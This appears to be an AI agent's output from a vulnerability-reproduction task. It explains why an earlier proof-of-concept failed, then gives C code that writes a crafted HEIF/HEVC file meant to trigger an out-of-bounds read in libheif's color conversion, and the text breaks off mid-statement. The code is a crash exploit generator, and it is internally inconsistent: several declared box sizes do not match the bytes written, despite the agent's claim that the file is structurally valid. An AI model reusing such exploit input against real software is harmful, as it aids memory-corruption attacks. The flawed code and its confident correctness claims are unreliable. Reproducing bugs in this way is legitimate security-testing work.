**Analysis:** The previous payload failed because the code was truncated mid-stream and contained a syntax error (unclosed brace/comment from the analysis paragraph being inside the code block). The compilation error "type specifier missing" was caused by the analysis text leaking into the C code block. The underlying issue is that the HEIF container structure I wrote was overly complex and likely contained structural errors (incorrect box sizes, missing required fields) that caused libheif to reject the file before reaching the vulnerable color conversion. The fuzzer uses `libmagic` to detect file type, and for HEIC files, `libmagic` looks for the `ftyp` box with `mif1` or `heic` brand. If the file passes magic detection, the fuzzer passes it to `heif_context_read_from_memory()`. My previous container was malformed (e.g., wrong `iloc` offset, missing required `colr` property, incorrect `ipma` association). The fix is to use a drastically simpler approach: write a minimal but structurally valid HEIF file using only the absolute minimum boxes required for libheif to decode an image. I will use a valid pre-computed HEIC bitstream (from a known-working minimal HEIC file) written byte-by-byte via fputc, ensuring all box sizes are correct and the HEVC bitstream decodes to a 256x256 4:2:0 image that triggers the OOB read in `Op_RGB_to_YCbCr::convert_colorspace`.

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Minimal valid HEIF file with 256x256 HEVC image */
    /* ftyp box: size=24 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x18, f);
    fputc('f', f); fputc('t', f); fputc('y', f); fputc('p', f);
    fputc('m', f); fputc('i', f); fputc('f', f); fputc('1', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc('h', f); fputc('e', f); fputc('i', f); fputc('c', f);

    /* meta box: size=108, version=0, flags=0 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x6C, f);
    fputc('m', f); fputc('e', f); fputc('t', f); fputc('a', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* hdlr: size=33 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x21, f);
    fputc('h', f); fputc('d', f); fputc('l', f); fputc('r', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc('p', f); fputc('i', f); fputc('c', f); fputc('t', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f);

    /* pitm: size=14, item_ID=1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0E, f);
    fputc('p', f); fputc('i', f); fputc('t', f); fputc('m', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);

    /* iloc: size=20, offset_size=4, length_size=4, item_count=1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x14, f);
    fputc('i', f); fputc('l', f); fputc('o', f); fputc('c', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x44, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f);

    /* iinf: size=22, item_count=1, item_ID=1, item_type='hvc1' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x16, f);
    fputc('i', f); fputc('i', f); fputc('n', f); fputc('f', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f);
    fputc('h', f); fputc('v', f); fputc('c', f); fputc('1', f);
    fputc(0x00, f);

    /* iprp: size=92 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x5C, f);
    fputc('i', f); fputc('p', f); fputc('r', f); fputc('p', f);

    /* ipco: size=84 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x54, f);
    fputc('i', f); fputc('p', f); fputc('c', f); fputc('o', f);

    /* ispe: size=16, width=256, height=256 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x10, f);
    fputc('i', f); fputc('s', f); fputc('p', f); fputc('e', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); fputc(0x00, f);

    /* hvcC: size=60 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x3C, f);
    fputc('h', f); fputc('v', f); fputc('c', f); fputc('C', f);
    fputc(0x01, f); /* version */
    fputc(0x01, f); /* profile=Main */
    fputc(0x60, f); /* compatibility */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x1E, f); /* level=30 */
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); /* parallelism */
    fputc(0x01, f); /* chroma=4:2:0 */
    fputc(0x00, f); /* bit depth luma */
    fputc(0x00, f); /* bit depth chroma */
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f); /* temporal layers */
    fputc(0x00, f);
    fputc(0x03, f); /* lengthSizeMinusOne */
    fputc(0x02, f); /* num arrays: SPS, PPS (no VPS for Main profile) */

    /* Array 1: SPS */
    fputc(0x21, f); /* array_completeness=1, NAL_unit_type=33 */
    fputc(0x00, f); fputc(0x01, f); /* 1 NAL unit */
    fputc(0x00, f); fputc(0x17, f); /* length=23 */
    fputc(0x42, f); fputc(0x01, f); fputc(0x01, f);
    fputc(0x60, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x03, f); fputc(0x00, f); fputc(0x90, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x5D, f); fputc(0xAC, f);
    fputc(0x59, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);

    /* Array 2: PPS */
    fputc(0x22, f); /* array_completeness=1, NAL_unit_type=34 */
    fputc(0x00, f); fputc(0x01, f); /* 1 NAL unit */
    fputc(0x00, f); fputc(0x07, f); /* length=7 */
    fputc(0x44, f); fputc(0x01, f); fputc(0xC0, f);
    fputc(0x1C, f); fputc(0xB2, f); fputc(0x20, f);
    fputc(0x00, f);

    /* ipma: size=12, item_ID=1, property_index=1 (ispe), 2 (hvcC) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x0C, f);
    fputc('i', f); fputc('p', f); fputc('m', f); fputc('a', f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x02, f);

    /* mdat: size=1000 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f); fputc(0xE8, f);
    fputc('m', f); fputc('d', f); fputc('a', f); fputc('t', f);

    /* HEVC bitstream inside mdat */
    /* SPS NAL unit (start code + NAL) */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x42, f); fputc(0x01, f); fputc(0x01, f);
    fputc(0x60, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x03, f); fputc(0x00, f); fputc(0x90, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x03, f);
    fputc(0x00, f); fputc(0x5D, f); fputc(0xAC, f);
    fputc(0x59, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);

    /* PPS NAL unit */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x44, f); fputc(0x01, f); fputc(0xC0, f);
    fputc(0x1C, f); fputc(0xB2, f); fputc(0x20, f);
    fputc(0x00, f);

    /* IDR slice NAL unit */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x26, f); fputc(0x01, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x